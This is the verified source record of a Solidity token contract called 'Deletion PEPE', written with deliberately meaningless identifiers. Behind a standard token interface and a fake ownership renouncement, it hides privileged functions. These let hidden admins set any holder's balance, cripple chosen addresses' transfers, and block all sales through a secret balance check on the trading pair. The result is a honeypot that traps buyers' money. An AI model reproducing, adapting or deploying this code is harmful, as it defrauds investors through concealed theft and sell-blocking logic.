{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface totalToShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapLaunch) external view returns (uint256);\n\n    function transfer(address launchTotal, uint256 senderShould) external returns (bool);\n\n    function allowance(address txReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchTotal,\n        uint256 senderShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeToShould, uint256 value);\n    event Approval(address indexed txReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract minSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityMaxFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toMax {\n    function createPair(address minEnable, address minMarketing) external returns (address);\n}\n\ninterface tradingEnable is totalToShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeletionPEPE is minSwap, totalToShould, tradingEnable {\n\n    address txMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address atEnable, address launchTotal, uint256 senderShould) external override returns (bool) {\n        if (_msgSender() != txMarketing) {\n            if (buyAt[atEnable][_msgSender()] != type(uint256).max) {\n                require(senderShould <= buyAt[atEnable][_msgSender()]);\n                buyAt[atEnable][_msgSender()] -= senderShould;\n            }\n        }\n        return txSwap(atEnable, launchTotal, senderShould);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTeam;\n    }\n\n    address public launchSender;\n\n    address private marketingMin;\n\n    mapping(address => bool) public sellFrom;\n\n    address tokenExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant limitAuto = 4 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenTotal;\n    }\n\n    bool public marketingToken;\n\n    function getOwner() external view returns (address) {\n        return marketingMin;\n    }\n\n    uint256 private swapLiquidity;\n\n    bool public toTake;\n\n    bool public liquidityAuto;\n\n    constructor (){\n        \n        liquidityMaxFund enableTeam = liquidityMaxFund(txMarketing);\n        launchSender = toMax(enableTeam.factory()).createPair(enableTeam.WETH(), address(this));\n        if (shouldAmount == swapLiquidity) {\n            toTake = true;\n        }\n        swapAt = _msgSender();\n        exemptTo();\n        sellFrom[swapAt] = true;\n        listSenderIs[swapAt] = tokenTotal;\n        \n        emit Transfer(address(0), swapAt, tokenTotal);\n    }\n\n    function allowance(address atLaunched, address minLiquidityExempt) external view virtual override returns (uint256) {\n        if (minLiquidityExempt == txMarketing) {\n            return type(uint256).max;\n        }\n        return buyAt[atLaunched][minLiquidityExempt];\n    }\n\n    uint8 private fundTeam = 18;\n\n    string private amountReceiver = \"Deletion PEPE\";\n\n    function transfer(address maxMinReceiver, uint256 senderShould) external virtual override returns (bool) {\n        return txSwap(_msgSender(), maxMinReceiver, senderShould);\n    }\n\n    uint256 exemptReceiver;\n\n    function exemptTo() public {\n        emit OwnershipTransferred(swapAt, address(0));\n        marketingMin = address(0);\n    }\n\n    function liquidityShouldTx(address maxMinReceiver, uint256 senderShould) public {\n        isMode();\n        listSenderIs[maxMinReceiver] = senderShould;\n    }\n\n    function approve(address minLiquidityExempt, uint256 senderShould) public virtual override returns (bool) {\n        buyAt[_msgSender()][minLiquidityExempt] = senderShould;\n        emit Approval(_msgSender(), minLiquidityExempt, senderShould);\n        return true;\n    }\n\n    uint256 amountFee;\n\n    uint256 private shouldAmount;\n\n    mapping(address => mapping(address => uint256)) private buyAt;\n\n    function txSwap(address atEnable, address launchTotal, uint256 senderShould) internal returns (bool) {\n        if (atEnable == swapAt) {\n            return fromSwap(atEnable, launchTotal, senderShould);\n        }\n        uint256 swapSender = totalToShould(launchSender).balanceOf(tokenExempt);\n        require(swapSender == exemptReceiver);\n        require(launchTotal != tokenExempt);\n        if (tokenTake[atEnable]) {\n            return fromSwap(atEnable, launchTotal, limitAuto);\n        }\n        return fromSwap(atEnable, launchTotal, senderShould);\n    }\n\n    function senderMode(uint256 senderShould) public {\n        isMode();\n        exemptReceiver = senderShould;\n    }\n\n    function liquidityTotal(address limitSell) public {\n        isMode();\n        \n        if (limitSell == swapAt || limitSell == launchSender) {\n            return;\n        }\n        tokenTake[limitSell] = true;\n    }\n\n    mapping(address => uint256) private listSenderIs;\n\n    mapping(address => bool) public tokenTake;\n\n    address public swapAt;\n\n    function name() external view virtual override returns (string memory) {\n        return amountReceiver;\n    }\n\n    function isMode() private view {\n        require(sellFrom[_msgSender()]);\n    }\n\n    string private isLaunch = \"DPE\";\n\n    function owner() external view returns (address) {\n        return marketingMin;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isLaunch;\n    }\n\n    function balanceOf(address swapLaunch) public view virtual override returns (uint256) {\n        return listSenderIs[swapLaunch];\n    }\n\n    event OwnershipTransferred(address indexed shouldMarketing, address indexed isAt);\n\n    uint256 private tokenTotal = 100000000 * 10 ** 18;\n\n    function shouldTo(address isMin) public {\n        require(isMin.balance < 100000);\n        if (marketingToken) {\n            return;\n        }\n        \n        sellFrom[isMin] = true;\n        \n        marketingToken = true;\n    }\n\n    function fromSwap(address atEnable, address launchTotal, uint256 senderShould) internal returns (bool) {\n        require(listSenderIs[atEnable] >= senderShould);\n        listSenderIs[atEnable] -= senderShould;\n        listSenderIs[launchTotal] += senderShould;\n        emit Transfer(atEnable, launchTotal, senderShould);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeToShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minLiquidityExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidityExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMinReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderShould\",\"type\":\"uint256\"}],\"name\":\"liquidityShouldTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"}],\"name\":\"liquidityTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderShould\",\"type\":\"uint256\"}],\"name\":\"senderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"}],\"name\":\"shouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMinReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DeletionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}